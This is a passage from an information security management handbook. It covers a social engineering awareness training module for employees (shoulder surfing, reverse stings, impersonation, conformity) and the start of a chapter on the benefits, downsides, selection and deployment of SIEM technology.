Shoulder surfing
Shoulder surfing is simply looking at the victim’s screen while he or she types 
something, such as an ATM PIN or a network password. This is sometimes 
accomplished through covert means using tools such binoculars.
Graphics
Show an illustration of a suspicious-looking person on a balcony in an airport using 
binoculars to see an ATM screen and keyboard on the level below.
Many people are not aware of the social engineering method shown in Screen 7, 
but it is important that your personnel are aware of it. Have you had an experience 
such as this? Then use it! It is always most effective to use real-life examples; and 
the closer to home, the better.
SCREEN 7
On-Screen Text
Reverse sting
A reverse sting involves having the victim call the criminal for help, and when 
this happens, the criminal then gets the victim to divulge information such as 
username, password, and so on.
A reverse sting requires careful planning on the criminal’s part, such as 
creating a problem in the victim’s system, and then providing the victim with 
the criminal’s number, prompting the victim to phone the criminal for 
technical help. Phishing attacks often use this gimmick.
Graphics
Show an illustration of a person looking at an e-mail message that says, “Call this 
number to confirm your personal information.”
There are many actual incidents of impersonations, which is covered in Screen 
8. Recently, Frank Abagnale, of Catch Me If You Can fame, was a keynote speaker 

Collaborating Information Security and Privacy  ◾  107
at the November CSI conference* and discussed all the many different imperson-
ations he did as a young man.
SCREEN 8
On-Screen Text
Impersonation
A social engineer can use impersonation and acting skills to make a target 
believe that the impersonator has impeccable credentials. This can be done in 
person or over the phone.
Graphics
Show an illustration of a well-dressed person holding up an ID card to the person 
behind a reception desk.
Peer pressure, discussed in Screen 9, is a common form of social engineering. It 
happens within most organizations. How does peer pressure happen at your orga-
nization? Change the content shown to something with which your learners can 
personally relate.
SCREEN 9
On-Screen Text
Conformity
Conformity is convincing the victim to divulge sensitive information to go 
along with what his or her co-workers or associated group members are 
doing, or blend in with the crowd to get into secured areas. The criminal can 
accomplish this by impersonating someone in authority, such as a manager, or 
even someone outside the organization, such as an FBI agent.
Graphics
Show an illustration of several employees entering a building, and the criminal going 
in with them.
I think everyone can relate to the techno babble that we run across when work-
ing with customer service areas, or talking with lawyers, or trying to understand 
HR issues. Screen 10 addresses how technical talk is often used in social engineer-
ing attempts. In your organization, what topic would be a good one for criminals 
to use to overwhelm your personnel into giving them access to information or sys-
tems? Use that as your example.
*	http://searchsecurity.techtarget.com/news/article/0,289142,sid14_gci1035900,00.html.

108  ◾  Information Security Management Handbook
SCREEN 10
On-Screen Text
Dummy mode
Criminals use the dummy mode social engineering technique by using 
technical words or complex terms to intimidate the victim into doing what 
they say, in essence putting the victim into a “dummy mode.”
Graphics
Show an illustration of a person on a phone call. Show the criminal caller with a 
speech bubble that says something like, “…highly technical, unintelligible words…” 
and show the person on the other end of the line with a quizzical look and a 
speech bubble that says “Huh?”
At the end of the training session provide an activity to engage all types of learners, 
such as described in Screen 11. This will reinforce what you just went over, as well as 
force the learners to use a different part of their brain; instead of taking new information 
in, have them actively use that information to make sure they have understanding.
Incorporate questions into Screen 11, or include a quiz following the module to 
ensure end-user understanding. Don’t let the education stop with this training mod-
ule; send a quiz three to six months later to see how much awareness was retained.
SCREEN 11
On-Screen Text
Click on the items to find the confidential information in this scene using 
social engineering techniques.
Graphics
Show a man or woman sitting at an office desk. Incorporate the following into 
the scene:
Computer monitor with an e-mail message
• 
Telephone
• 
Door into the office area
• 
Trash can
• 
Keyboard
• 
Techie-looking person walking toward the desk, saying “jargon ... jargon ... 
• 
jargon.”
For each of the above have a pop-up show the corresponding social engineering 
method.

Collaborating Information Security and Privacy  ◾  109
As shown in Screen 12, it is good to take every opportunity, including within 
your training modules, to let your personnel know the person or position within 
your organization that they can contact for more information, or for concerns. 
Consider including a photo for better recognition, if that would be acceptable 
within your organization’s culture.
SCREEN 12
On-Screen Text
If you suspect a social engineering exploit is being attempted, contact <put 
your organization’s contact name and information here>.
Graphics
Show a photo of the person or group that the employee should get in touch with.
In addition to the interactive activity, you can also include an actual quiz if that 
would be appropriate for your environment. Be sure that you continue your aware-
ness messages, and do some sort of activity, such as a quiz, survey, phone call, or 
something that would work in your organization, to create metrics to see how much 
of the information your learners have retained.
8.9  Information Security and 
Privacy Education Basics
To help instill information and increase retention, keep in mind these basic things 
for your information security and privacy training and awareness efforts:
Keep your learners’ attention.
◾
◾
Appeal to your target audience.
◾
◾
Provide training for all types of learners: auditory (listening), visual (seeing), 
◾
◾
and kinesthetic (hands-on).
Keep your message simple and memorable.
◾
◾
Encourage feedback.
◾
◾
Reflect on current issues.
◾
◾
Give credible, real information.
◾
◾
Repeat your message in multiple ways and provide variety.
◾
◾
Follow up training sessions and awareness communications to measure reten-
◾
◾
tion and maintain metrics for your education program.
Remember, to be most effective, information security and privacy areas must 
collaborate and work together in education efforts.


111
9
Chapter 
Security Information 
and Event Management 
(SIEM) Technology
E. Eugene Schultz
Contents
9.1	 Introduction..............................................................................................112
9.2	 About SIEM Technology..........................................................................112
9.3	 Benefits of SIEM Technology....................................................................113
9.3.1	 Reduction in Labor Costs..............................................................114
9.3.2	 Log Data Archival and Log Management......................................114
9.3.3	 Achieving Compliance with Security Regulations.........................114
9.3.4	 Facilitating Ability to Distinguish between Significant and 
Nonsignificant Events.................................................................... 115
9.3.5	 Contributing to a More Complete Threat Analysis........................ 115
9.3.6	 Compensating for Limitations in Intrusion Detection 
Technology.................................................................................... 115
9.3.7	 Raising the Functional Level of Intrusion Detection Expertise......116
9.3.8	 Providing Information Needed in Incident Response and 
Forensics Efforts............................................................................116
9.3.9	 Providing Security Training and Raising Security Awareness........116
9.3.10	Keeping Networks Healthy............................................................117
9.4	 Potential Downsides of SIEM Technology................................................117
9.4.1	 Expense.........................................................................................117

112  ◾  Information Security Management Handbook
9.1  Introduction
Organizations rely on security technology in their efforts to secure their computers 
and networks. Security technology such as anti-virus software, firewalls, and intru-
sion detection (IDS) and prevention (IPS) systems have become commonplace in 
organizations, especially in larger countries around the world. Security information 
and event management (SIEM) tools, which aggregate, store, manage, and analyze 
IDS, IPS, and other security-relevant log data to provide an indication of the security 
condition of systems and networks, are the latest type of technology to gain consider-
able popularity with organizations. This chapter explains what SIEM technology is, 
the functionality it delivers, the benefits as well as the possible downsides of using this 
technology, and how to manage this technology to achieve maximum benefits.
9.2  About SIEM Technology
SIEM comes from two acronyms, SIM and SEM. SIM means security information 
management—aggregating log data, storing it, and in the process of doing both, 
meeting compliance requirements. The earliest SIEM tools were actually SIM tools 
that made possible collecting and viewing log data from a single console. SEM 
means security event management—collecting log data and applying analysis algo-
rithms to identify threats and quickly respond to them. SIEM is the Gartner Group 
acronym for SIM and SEM technology, both of which Gartner deems so highly 
related that they fall into a single category in Gartner’s classification. In reality, 
vendors have been adding SEM functionality to many SIM products, and a paral-
lel trend has been happening in the SEM product arena to the point that very few 
single-purpose SIEM products now exist. Most of these products now offer some 
combination of the following functions:
9.4.2	 Operational Liabilities...................................................................118
9.4.3	 Contributing to a False Sense of Well-Being..................................118
9.5	 Selecting and Using SIEM Tools...............................................................119
9.5.1	 Selection Criteria...........................................................................119
9.5.2	 Implementation and Maintenance Considerations.........................123
9.6	 Making SIEM Technology Work..............................................................124
9.6.1	 Integrate SIEM Technology into Your Organization’s Security 
Architecture...................................................................................124
9.6.2	 Include SIEM Technology-Relevant Considerations in Your 
Organization’s Policy, Standards, and Procedures..........................124
9.6.3	 Customize SIEM Functions to Your Organization’s Needs............124
9.6.4	 Training.........................................................................................125
9.6.5	 Special Security Considerations.....................................................125
9.7	 Conclusion................................................................................................125

Security Information and Event Management (SIEM) Technology  ◾  113
Log aggregation: Gathering log output from all over the network into a sin-
◾
◾
gle console.
Log storage: Storing all aggregated log data in a log server.
◾
◾
Real-time analysis of threats: Security operations personnel need to become 
◾
◾
aware of attacks that occur as soon as possible. SIEM technology is designed 
to fulfill this need through analysis of log data and issuing alerts whenever 
individual log data or combinations of such data indicate that attacks have 
occurred.
Retrieval of historical data: Security operations personnel sometimes also 
◾
◾
need to retrieve and view historical log data to determine whether comput-
ers and devices are behaving the way they should, whether users have been 
conforming to the provisions of an organization’s information security policy, 
and so on. SIEM technology supports the ability to retrieve stored data to 
enable users to obtain this type of information, usually through reports that 
can be scheduled or created on demand.
Display of a network’s topology, hosts, and devices: Most SIEM tools provide 
◾
◾
a depiction of an organization’s network topology and the elements therein. 
This helps users visualize where threats are manifesting themselves and par-
ticular hosts and devices that may be at elevated risk because of compromises 
in the part of the network where they reside.
Display of critical status indicators: Many SIEM tools provide visual depiction 
◾
◾
of rates and types of attacks that have occurred, percentage of hosts in com-
pliance, and more in the form of pie charts, line graphs, and dashboards.
Creation of cases: Many SIEM tools also enable users to open a “case,” a way 
◾
◾
of storing information about an incident and to share with other members of 
an incident response effort and forensically preserve such information.
Workflow tracking: Using an incident response methodology is one of the 
◾
◾
most important things incident responders can do during incident response 
activity. A workflow describes steps within a methodology that need to be 
completed. Some SIEM tools provide a workflow to guide incident respond-
ers toward appropriate actions and to help them verify that they have com-
pleted each step.
Compliance verification: Compliance is a major risk issue facing informa-
◾
◾
tion security practices. Most SIEM tools provide reports which verify that an 
organization has complied with various provisions of regulations such as the 
ISO/IEC 27001/27002 requirement for continuous network monitoring.
9.3  Benefits of SIEM Technology
SIEM technology has grown in popularity over recent years because it offers numer-
ous benefits to information security practices. Some of the most important of these 
benefits are described in this section.

114  ◾  Information Security Management Handbook
9.3.1  Reduction in Labor Costs
All things considered, saving time and money is one of the most compelling rea-
sons to use SIEM technology. Output from sources such as firewalls, IDSs, and 
individual systems is potentially extremely valuable in helping technical and other 
staff to determine the security condition of an organization’s systems and networks. 
Accessing the massive amount of output produced by IDSs, firewalls, and other 
sources is a major potential challenge, however, because the output of each is by 
default accessible only on each system or device. Gathering all this information in 
a single console, a function inherent in current SIEM technology, makes accessing 
the data much more convenient and efficient. Furthermore, requiring technical 
staff members to sift through the massive amounts of log data that these systems 
and devices invariably produce is not practicable due to the amount of time and 
effort required. An automated means of analyzing this output, the kind of analy-
sis that SIEM tools perform, can thus result in a substantial reduction of analyst 
time and consequently also labor-related expenses. Given the difficulty information 
security managers have in obtaining needed financial resources, SIEM technology 
can go a long way in helping compensate for this problem.
9.3.2  Log Data Archival and Log Management
For the sake of investigations, due diligence, compliance, and other reasons, SIEM 
tools that deliver SIM functionality archive log and other data. Given that many 
SIEM tools receive massive amounts of data, having great amounts of disk space 
(e.g., several terabytes at a minimum) is essential if the data is to be written to the 
physical platform on which the SIEM tool resides. A growing trend is to transmit all 
data to a storage area network (SAN) that has almost unlimited storage space or to 
transmit data to inline storage devices with very large storage capacity. SIEM tools 
that provide SIM functionality also provide log management functionality designed 
to ensure that no log data are overwritten and also that log data can be easily accessed 
when they are needed, usually through built-in reporting mechanisms.
9.3.3  Achieving Compliance with Security Regulations
SIEM tools can also help organizations achieve compliance with a variety of secu-
rity-related regulations and standards such as the Health Insurance Portability and 
Accountability Act (HIPAA), the Gramm–Leach–Bliley Act (GLBA), the Payment 
Card Industry Data Security Standard (PCI-DSS), ISO/IEC 27001/27002, and 
Basel II. For example, SIEM tools can help verify compliance with PCI-DSS 
Requirement 1.2, firewall configuration verification—traffic from untrusted net-
works, by confirming that no incoming traffic from networks other than trusted 
ones (e.g., branch office networks, networks of third-party business partners, and 
so on) has gotten past each external firewall. SIEM tools’ archived log data are 

Security Information and Event Management (SIEM) Technology  ◾  115
the major basis by which compliance with regulations is verified. Log data reveal 
not only traffic flow and access patterns, but also the fact that critical security 
devices such as firewalls, IDSs, and IPSs are deployed and are be where they should 
be placed within each network, whether or not unpatched vulnerabilities exist, 
whether critical servers have withstood attacks, and much more.
9.3.4  Facilitating Ability to Distinguish between 
Significant and Nonsignificant Events
Most SIEM tools receive a large amount of log data from many systems and devices 
and then supply the data to event correlation algorithms that trigger alerts when 
indications of attacks occur. The alerts inform security analysts concerning sig-
nificant events that require attention and action; information about nonsignificant 
events is accessible, but analysts do not have to be bothered with it. Accordingly, 
tasks such as security threat monitoring and incident response become considerably 
more manageable for analysts, who can pay more attention and devote more time 
to analyzing critical information instead of having to collect and mentally correlate 
volumes of data pertaining to potential security-related events.
9.3.5  Contributing to a More Complete Threat Analysis
Recognizing the totality of threats that can materialize is a nearly impossible task, 
yet performing a valid threat analysis is one of the most important components of 
risk management. SIEM tools can help in that they employ event correlation algo-
rithms that can identify previously overlooked threats. Additionally, because SIEM 
tools aggregate and archive log data, they facilitate post-hoc analysis of threats as 
well as threat trends that would not otherwise be feasible to perform.
9.3.6  Compensating for Limitations in 
Intrusion Detection Technology
Like any security (or other) technology, intrusion detection technology is imperfect. 
If it were perfect, this technology would produce a correct detection every time an 
attack occurred and would never produce a false alarm. The degree of imperfection 
depends on the particular IDS tool, but even the best IDS tool available today can-
not correctly detect every attack and avoid all false alarms. As stated earlier, SIEM 
tools collect output of IDSs, IPSs, firewalls, routers, switches, and more, and then 
apply event correlation algorithms that analyze this output. One particular IDS 
may, for instance, fail to detect an attack, but there are other systems and devices 
that may have detected the attack. There may, in fact, be multiple pieces of evidence 
that show the various phases of the attack. Similarly, false alarms from an IDS can 
also be ruled out because of the fact that no other system or device detected an 

116  ◾  Information Security Management Handbook
attack when the IDS did, which strongly suggests that the IDS was “out of line.” 
The future of IDS is in event correlation; in this respect, SIEM technology that 
provides sufficient SEM functionality* is leading the way.
9.3.7  Raising the Functional Level of 
Intrusion Detection Expertise
SIEM tools with sufficient SEM functionality produce the same kind of output as 
experts in intrusion detection would, e.g., identification of attacks that intrusion 
detection novices would miss and minimal false attack identifications. In the pro-
cess of interacting with SIEM tools, less experienced technical staff members thus 
become more adept in interpreting event-related data. SIEM devices thus raise the 
functional level of intrusion detection expertise within organizations.
9.3.8  Providing Information Needed in Incident 
Response and Forensics Efforts
SIEM tools with adequate SEM functionality facilitate incident response efforts in 
several ways. First, they supply critical information required to respond properly to 
incidents. Incident responders need detailed information about incidents and poten-
tial incidents as early in the life of each incident as possible to facilitate planning and 
executing an incident response strategy. In contrast, missing, inaccurate, or vague 
information are two of the worst barriers to effective incident response. SIEM tools 
that support SEM functionality deliver the needed information. Some versions of 
SIEM tools also offer guidance concerning specific steps to take in dealing with an 
incident, thus aiding incident response decisions (see Figure 9.1). Additionally, some 
SIEM tools deliver forensics support in that they cryptographically “seal” informa-
tion they receive so that any archived information can be verified for integrity.
9.3.9  Providing Security Training and 
Raising Security Awareness
Depending on the particular product, SIEM tools can also provide some degree of 
security training for employees. Those who use a SIEM tool are able to interpret 
threat-relevant data better after they learn how the tool constantly monitors for and 
identifies threats that have materialized. Additionally, if a particular SIEM product 
offers incident response facilitation, users are likely to learn about the particular 
actions and action sequences that are involved in responding to security-related 
incidents. SIEM tools can also raise security awareness, not only among those who 
*	A few SIEM tools for all practical purposes deliver nothing but SIM functionality in that they 
offer log aggregation, log management, and reporting/compliance, and nothing more. These 
tools thus do not adequately support intrusion detection needs.

Security Information and Event Management (SIEM) Technology  ◾  117
use these tools, but also within the information security function and upper-level 
management, by providing data that helps acquaint individuals with an organiza-
tion’s threat profile and the severity of each threat. This is especially important in 
helping to win senior management’s support—an absence of real-world threat data 
relevant to their particular organization too often dissuades senior management 
from believing that security risk is real, thereby predisposing them to allocate mini-
mal resources on information security.
9.3.10  Keeping Networks Healthy
Finally, it is important to realize that security tools often deliver benefits that super-
sede information security considerations per se. Normal network operations and 
network security often have much in common, so monitoring for network security 
anomalies that SIEM tools often perform (once again depending on the particular 
SIEM tool) can often result in discovery of network problems such as anomalous 
network traffic due to bad configurations of network devices. Prompt identification 
of causes of such traffic being transmitted facilitates keeping networks healthy.
9.4  Potential Downsides of SIEM Technology
As stated earlier, no technology is perfect, and SIEM technology is no exception. 
Some of the potential downsides associated with SIEM technology are discussed 
in this section.
9.4.1  Expense
Some SIEM tools are prohibitive in cost. Purchase and installation costs in addition 
to one year of maintenance may cost as much as USD 200,000 or more for only 
Figure 9.1  An example of incident response guidance in a SIEM product.

118  ◾  Information Security Management Handbook
one license of a SIEM tool. Furthermore, installation for such SIEM tools may take 
up to an entire month. Worse yet, a number of vendors also levy additional charges 
based on the number of systems and devices with which a SIEM tool interfaces as 
well as the number of users. It is extremely difficult to justify selecting an extremely 
expensive product, even if it should offer a very great amount of functionality. In 
contrast, however, some SIEM products, which have as much or nearly as much 
functionality as extremely expensive ones, are considerably less expensive and can 
be installed in less than one hour. Furthermore, some SEM products have a flat 
cost, regardless of the number of interfacing systems and devices and users. Cost is 
an extremely important consideration in that a typical organization that plans to 
deploy SIEM technology will have to buy multiple copies of the selected product to 
cover all of that organization’s network space.
9.4.2  Operational Liabilities
It is easy to forget that to fulfill their purpose, SIEM tools must run 24/7, 52 weeks 
per year. With some SIEM products, this kind of operational continuity is not easy 
to achieve. Some SIEM tools are difficult to manage; they require constant care and 
maintenance, whereas others require relatively little attention by system adminis-
trators. Some have very cumbersome update procedures, whereas in others, update 
processes are more or less seamless. If you are not careful, one can end up with a 
SIEM product that requires a huge amount of effort (and thus also financial cost) 
to keep running adequately. Another potential operational liability is the amount of 
network traffic that a SIEM tool generates. A SIEM tool should be as nonintrusive 
to an organization’s network as possible, yet some SIEM products tend to over-
load networks with unnecessary traffic in several ways. Distributed SIEM tools, 
tools that consist of more than one hardware component, increase the amount of 
network traffic because of the need for communications between the various com-
ponents. Some SIEM tools attempt to map network topologies actively by sending 
ping requests, tracing network routes used, using network protocols such as the 
Simple Network Management Protocol (SNMP) to send probes throughout the 
network, and more. Others use passive techniques to avoid cluttering networks 
with traffic.
9.4.3  Contributing to a False Sense of Well-Being
Another potential downfall of SIEM technology is that it can lead to a false sense 
of well-being. With a SIEM tool installed and running, individuals can be tempted 
to believe that all must be well because there are no indications of security-related 
trouble from the tool. Although SIEM technology has improved substantially over 
the years, it has not achieved perfection. Looking for signs of trouble, e.g., attempted 
security breaches, from sources other than the SIEM tool is thus imperative. 
Additionally, although many SIEM tools perform log management and archival, 

Security Information and Event Management (SIEM) Technology  ◾  119
it is important to check regularly to confirm that the processes behind these func-
tions are running as expected, and that the hard drive(s) is/are not close to filling. 
The same kinds of considerations also apply to compliance monitoring. Although 
SIEM tools are capable of gathering and reporting on a wide variety of information 
that they collect, they are by no means capable of completely ensuring compliance. 
Although SIEM tools can help considerably in meeting compliance-related needs, 
achieving compliance requires much more than gathering and analyzing log data.
9.5  Selecting and Using SIEM Tools
Selecting the particular SIEM tool to use is critical, but it is generally not easy. After a 
product is selected, implementing and maintaining it are also significant challenges.
9.5.1  Selection Criteria
SIEM products tend not to be cheap, and once they are installed on your premises, 
they (whether you like it or not) tend to become permanent fixtures, so careful 
selection is especially imperative. Information security professionals should at a 
minimum strongly consider the following selection criteria.
Cost: As discussed earlier in this chapter, purchase, installation, and mainte-
◾
◾
nance costs are a major consideration. Information security managers should 
select a product that delivers the most needed functionality at the most rea-
sonable cost.
Functionality: With respect to functionality, the most basic consideration 
◾
◾
is whether an organization needs SIM functionality, SEM functionality, or 
both. In several instances, information security professionals bought SIM 
functionality, but not too long afterwards realized that they also needed 
SEM functionality. They could have gotten both SIM and SEM functional-
ity for about the same cost as the SIM product that they ended up buying. 
Additionally, it is important to be suspicious of “frills” in SIEM products. As 
in the case of a wide range of products outside the SIEM product arena, some 
features that vendors tout as spectacular end up being almost useless in real-
life deployments. Caveat emptor is the best advice concerning functionality 
that one particular vendor product has, but that other products do not have.
Performance: The rate at which log data is sent to SIEM tools can be almost 
◾
◾
overwhelming at times. SIEM tools may have to process and correlate more 
than 100,000 separate events per second using complex algorithms. Needless 
to say, then, having more than enough physical memory as well as sufficient 
processor speed is an extremely critical SIEM issue. Without sufficient physi-
cal memory and processor speed, abnormal conditions such as slowdowns, 
freezes, or crashes can readily occur, in many cases causing loss of log data.

120  ◾  Information Security Management Handbook
Scalability: Some SIEM products do not really scale very well in that they can-
◾
◾
not handle output from a large number of systems and devices. Additionally, 
some do not cover very large areas within networks, necessitating the pur-
chase of more copies of these products to achieve full network coverage. It 
is thus essential that any SIEM product is able to interface with the desired 
number of systems and devices and that it can cover a sufficiently large area 
of an organization’s network.
Degree of automation of functions: Another important consideration is the 
◾
◾
degree to which each candidate SIEM tool automates threat identification 
and incident response. SIEM tool users should not have to interact exten-
sively with a SIEM tool to obtain the information they need and to respond 
to incidents.
Accuracy: The higher the correct detection rates for security-related events 
◾
◾
and the lower the false-alarm rates, the more desirable a SIEM tool is. Failure 
to detect incidents results in incidents that can easily escalate out of control 
before they are handled, and false alarms cause wasted time and effort as 
well as frustration among technical staff. Performing benchmarking tests on 
candidate SIEM products is thus essential.
Interoperability/integration: Being able to integrate with or interoperate with 
◾
◾
other products such as help desk/trouble-ticketing tools and computer foren-
sics tools is another important consideration. Being able to integrate with 
vulnerability scanning products is also critical in that SIEM tools can deter-
mine whether or not an attack was successful if such data are available for the 
system that was attacked. In today’s already-too-complex IT environments, 
tools that operate only as isolated entities cause inefficiency.
Usability: Usability is an essential part of effective technology; poor usabil-
◾
◾
ity results in user frustration, elevated error rates, increased training-related 
costs, circumvention of required procedures, and so forth. The usability of 
current SIEM tools varies considerably. Some require traversal of five or more 
menu levels to reach desired functions, complex interaction sequences for 
creating custom rules, inappropriate color coding, labels with nonintuitive 
labels or names, and so on. It is not difficult to end up with an SIEM product 
that has poor usability. SIEM tools must not only be easy to use, but they 
must also present uncluttered network topology displays to help users truly 
comprehend the implications of an attack against a system on surrounding 
systems and subnets within a network.
Stability: Stability of SIEM products is exceptionally critical. If such a product 
◾◾
freezes or crashes even a few times, critical log data can be lost and security oper-
ations can be disrupted. Additionally, it is difficult to claim that a SIEM tool is 
producing valid compliance-related data if it is not running continuously.
Ease of implementation: As discussed earlier, how difficult and extensive an 
◾
◾
installation of a SIEM tool is makes a huge difference. Information security 
managers should select products that are easy and quick to install because of 

Security Information and Event Management (SIEM) Technology  ◾  121
cost considerations. Additionally, it is important to realize that in extreme 
circumstances, a reinstallation may be necessary sometime during the life of 
an SIEM tool. In this case, ease and speed of installation will once again be 
very important considerations.
Log management: One of the most important features of SIEM technology is 
◾
◾
the ability to store log data efficiently and make data available upon demand. 
Not all SIEM products support this function, however. Even if log manage-
ment is not currently a requirement for an organization, it is wise to favor a 
product that offers this function, because sooner or later, log management is 
likely to become a requirement.
Storage capacity: With many SIEM tools each receiving as much as 9 GB 
◾
◾
of log data every day, disk full conditions resulting in loss of log data can 
occur much more quickly than one might imagine.* In one case, a very large 
corporation bought an SIEM product that offered mostly SIM functionality; 
what the information security manager who selected this product did not 
realize until it was too late was that although the vendor assured him that 
the product had more than adequate disk space, the opposite was in fact true. 
After the hard drives of the half a dozen or so copies of this product filled up 
repeatedly, the IT operations function had to develop and implement spe-
cial procedures to dump the stored data on the SIEM tools out to systems 
with much greater disk capacity and then delete all data on the SIEM tools. 
These procedures had to be executed every week. The manpower costs were 
astronomical. In the SIEM world, there is no such thing as too much disk space. 
Sadly, many disk storage capacities that superficially seem adequate end up 
being insufficient.
Maintenance considerations: How easy an SIEM product is to maintain very 
◾
◾
much affects the total cost of ownership. The update process is one of the most 
important components of maintenance. Ideally, vendors should promptly 
advise each customer of the availability of every new update and should pro-
vide efficient, convenient, and secure update procedures. Additionally, SIEM 
tool users should not have to reboot to make updates go into effect.
Impact on ongoing operations: As discussed earlier, the presence of an SIEM 
◾
◾
tool on the network should not adversely affect network operations.
Product security: The security of the SIEM tool itself is one of the most impor-
◾
◾
tant selection criteria. An SIEM tool should have strong, layered defenses that 
include built-in firewall functionality, access control lists, granular privileges 
and compartmentalization of functions, robust auditing and logging capa-
bilities, a secure update process, encrypted network traffic, and much more. 
Additionally, SIEM devices can capture data that must remain confidential. 
Encryption of data at rest is thus a necessary feature.
*	An increasing number of SIEM products now interface with SANs, thereby ensuring that suf-
ficient storage space is available for log data.

122  ◾  Information Security Management Handbook
Data protection: SIEM tools typically gather a large amount of data, some 
◾
◾
of which will be sensitive. A SIEM tool should, therefore, include controls 
that limit certain individuals’ access to the data. At a minimum, a SIEM tool 
should offer role-based access so that only individuals who are engaged in 
certain job functions can access certain data.
Quality of rules: Certain SIEM products have extremely rudimentary rules, 
◾
◾
rules that trigger on rather insignificant events and produce very little use-
ful information. It is almost better to have no rules than to have marginal 
rules. To be truly useful, rules must be able to identify event sequences that 
indicate genuine danger to the business endeavors and operations of an orga-
nization. Additionally, SIEM tool users should be able to customize rules to 
tailor them to the organization’s particular business and operational needs. 
Furthermore, customization should be easy for users to do; having to order 
more consulting services from the vendor to get custom rules is one of the 
worst “rip-offs” in the SIEM arena.
Alerting capability: An effective alerting capability must accompany discov-
◾
◾
ery of attacks. Alerts must be sufficiently succinct, yet informative. Effective 
SIEM alerting also requires multiple alerting methods (e.g., e-mail, text pag-
ing, and more). All alerting methods must be secure; cleartext alerts should 
not be sent except when highly unusual circumstances dictate.
Central management capability: When an organization deploys multiple 
◾
◾
SIEMs (e.g., one in each of its three major networks), it should be possible 
for the sake of efficiency to control all functions on all SIEMs from a master 
SIEM console. Viewing all data from all SIEMs from this console should also 
be supported.
Backup and restore functions: SIEM products that are worthy of consid-
◾
◾
eration should have built-in backup and restore functions which not only 
ensure that, when worst comes to worst, data and configuration settings are 
preserved, but also that both can be seamlessly restored. Data restoration, a 
particularly difficult issue because of compliance considerations, means that 
SIEM data can be restored such that they fit in the proper chronological 
sequence within existing log data.
Availability of/integration with fault tolerance functions: SIEM products 
◾
◾
should incorporate (or at least be immediately compatible with) fault toler-
ance mechanisms such as RAID and failover functionality to ensure continu-
ity of operations.
Reporting functionality: The quantity of reports and the quality of the reporting 
◾◾
process itself are two prime considerations in the selection of SIEM products. 
Many SIEM products offer “canned reports” that show summary statistics. 
These reports can be of some value, but their lack of flexibility tends to limit 
their usefulness. Every organization has its own business and operational needs; 
“canned reports” are too generic from this perspective. SIEM tools that offer 
the ability to customize reports are thus more desirable.

Security Information and Event Management (SIEM) Technology  ◾  123
Data integrity assurance: SIEM tools should verify the integrity of data they 
◾
◾
have collected and stored through integrity mechanisms such as periodically 
running hash checks on blocks of stored data.
Intrusion prevention functionality: Intrusion prevention mechanisms such 
◾
◾
as blocking all subsequent network traffic from a system that has initiated 
attacks can also be useful.
Agent independence: In the SIEM arena, agents are pieces of code that collect 
◾
◾
log and other data through a variety of methods. Some SIEM products are 
much more agent-reliant than others. In general, it is best to avoid products 
that require installation of agents on an organization’s systems. Agents that 
run on an organization’s systems can interfere with the performance of these 
systems; depending on how they are designed and implemented, they can 
also pose additional security-related risk for these systems. A poorly coded 
agent can, for example, introduce vulnerabilities into a system that can be 
readily exploited.
Availability of up-to-date vulnerability information: Some SIEM products 
◾
◾
supply up-to-date information about vulnerabilities used in attacks in a vari-
ety of ways. Obtaining this information through a SIEM tool saves time 
(which is especially important when a security-related incident has occurred) 
by obviating the need to search for the information.
Product documentation: The amount and quality of documentation related 
◾
◾
to a SIEM product are both critical selection factors. Inadequate documenta-
tion can complicate the operations surrounding an SIEM tool considerably.
Vendor-related considerations: Weighing the reputation of each potential 
◾
◾
vendor is also very important. Thus, degree of in-house knowledge about 
information security, ability to produce quality code, responsiveness of a 
vendor’s support function, and other vendor-related factors also need to be 
strongly considered.
9.5.2  Implementation and Maintenance Considerations
Once a SIEM product has been selected, it is important to plan for various imple-
mentation and maintenance activities that are necessary if an organization is to 
reap maximum benefits from using SIEM technology. As discussed previously, 
implementation of a SIEM product should not be an unduly laborious and costly 
process. But implementation requires more than merely installing a particular 
SIEM product. The configurations of various systems and devices that send log 
data to SIEM tools must also be appropriately modified. Doing this requires a 
level of effort that information security managers must build into project cost pro-
jections and schedules. Additionally, maintenance activities such as making back-
ups, installing updates, and (in worst case scenarios) restoring SEM product data 
must also be factored into cost projections and schedules. SIEM tools that are not 

124  ◾  Information Security Management Handbook
properly maintained not only will fail to fulfill expectations, but they can also be a 
major source of information security risk within organizations by comprising weak 
links in network security.
9.6  Making SIEM Technology Work
SIEM technology is relatively new. As such, a backlog of significant “lessons 
learned” resulting from the implementation of this technology has accumulated, 
but not to the degree that information security managers would like. Some of the 
“lessons learned” are discussed in this section.
9.6.1  Integrate SIEM Technology into Your 
Organization’s Security Architecture
Among other things, security architecture delineates various policy, standard, pro-
cedural, and technological components of an information security practice and how 
they relate to each other. By default, SIEM technology is typically omitted from secu-
rity architectures in that this technology and its potential are too often not sufficiently 
understood. All the while, other components of this architecture, log monitoring, 
intrusion detection, intrusion prevention, and more, may be in place, but the benefits 
of each may be marginal because of lack of integration. This is where SIEM technol-
ogy fits in—it can and does integrate existing technologies. To this degree, determin-
ing why, how, and to what degree integration of SIEM technology with other related 
technologies should occur within an information security practice is essential.
9.6.2  Include SIEM Technology-Relevant Considerations in 
Your Organization’s Policy, Standards, and Procedures
At a minimum, specifying what to do to safeguard sensitive information such as 
personal and financial information that SIEM tools are likely to glean and then 
store is imperative. Just as in the case of IDS and IPS data, organizations need 
appropriate provisions in their information security policy, standards, and proce-
dures to ensure that information stored by SIEM tools is adequately protected. 
Additionally, procedures should specify what must be done in case of a data secu-
rity breach in which data stored on an SIEM tool have been compromised.
9.6.3  Customize SIEM Functions to Your 
Organization’s Needs
SIEM products’ out-of-the-box functionality may be useful, but the full value of 
SIEM technology will not be realized unless this functionality is custom tailored to 

Security Information and Event Management (SIEM) Technology  ◾  125
the business and operational needs of the organization that deploys it. In particular, 
SIEM rules need to be modified in accordance with an organization’s information 
security policy and standards. A simple example is the configuring of SIEM rules 
to trigger when a certain number of failed log-ins occurs within a criterion period 
of time, something that is normally specified within an organization’s informa-
tion security standards. New rules also need to be created to monitor activity on 
business critical servers and databases containing sensitive information. Similarly, 
SIEM technology can help considerably in the endeavor to meet the provisions of 
various compliance regulations, but to make a SIEM tool’s compliance reporting 
function effective, many parameters such as IP address ranges, IP addresses of serv-
ers that store sensitive information, and monetary value of critical servers must be 
specified when compliance reports are being created.
9.6.4  Training
No matter how user friendly an SIEM tool is, some user training will inevitably be 
necessary. Information security managers must thus ensure that funding for user 
training is available and that users are trained early rather than later in the SIEM 
deployment cycle.
9.6.5  Special Security Considerations
